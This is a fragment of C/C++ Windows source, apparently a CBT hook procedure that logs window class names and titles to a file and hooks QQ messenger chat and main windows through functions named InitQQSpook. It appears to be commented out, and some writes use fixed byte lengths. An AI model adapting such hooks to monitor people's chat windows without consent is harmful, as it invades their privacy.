			WriteFile(hfile, (LPCVOID)_T("	Class:"), strlen((const char *)_T("	Class:")), &dwSize, NULL);
			TCHAR szClassName[128] = {0};
			int nRet = GetClassName((HWND)wParam, szClassName, 128);			
			if (nRet > 0) 
			{
				WriteFile(hfile, (LPCVOID)szClassName, 64, &dwSize, NULL);
			}

			WriteFile(hfile, (LPCVOID)_T("WinowText:"), 20, &dwSize, NULL);

			memset(szClassName, 0, 128);
			nRet = GetWindowText((HWND)wParam, szClassName, 64);
			if (nRet > 0) 
			{
				WriteFile(hfile, (LPCVOID)szClassName, 64, &dwSize, NULL);
			}

			WriteFile(hfile, (LPCVOID)_T("Is PP?"), 12, &dwSize, NULL);
			if (IsQQChat((HWND)wParam)) 
			{
				WriteFile(hfile, (LPCVOID)_T(" is 123 window"), 28, &dwSize, NULL);
			}
			WriteFile(hfile, (LPCVOID)_T("\n"), strlen((const char *) _T("\n")), &dwSize, NULL);
		}
		CloseHandle(hfile);
	}

 if (nCode == HCBT_ACTIVATE)
	{
		if (IsQQChat((HWND)wParam)) //Chat Window Pop up
		{
			PopMsg(_T("IsQQChat((HWND)wParam)"));
			// If this QQ chat window is not hooked.
			if (QQGetChatWindowByHandle((HWND)wParam) == -1) 
			{
				//MessageBox(NULL, _T("QQ new chat window"), _T("new window"), MB_OK);
				DWORD dwNewIndex = QQInsertChatWindowHandle((HWND)wParam);
				if (dwNewIndex != -1)
				{
					QQConvertToChatMode((HWND)wParam, dwNewIndex);
					QQSetActiveChatWindow((HWND)wParam); //Make It The Active
    				::InitQQSpook((HWND)wParam, FALSE);
					//PopMsg(_T("CBT new dwIndex %d "), dwNewIndex);
				}
				else //almost impossible to fail here
				{
					PopMsg(_T("Unable to Insert New Chat, Err Nightmare's CBTProc"));
				}
			}
		}
		if (IsQQMain(HWND(wParam)))
		{
			// The QQ main window is not hooked. 
			// Now I think only one QQ process can be created.
			// The following statement is when HCBT_CREATEWND.
			//g_hNightmareQQMainWnd = g_hPreviousQQMainWnd;
			g_hNightmareQQMainWnd = HWND(wParam);
			//MessageBox(NULL, _T("Found qq222"), _T("QQ main handle is"), MB_OK);
			::InitQQSpook(g_hNightmareQQMainWnd, TRUE);
		}
	}
*/
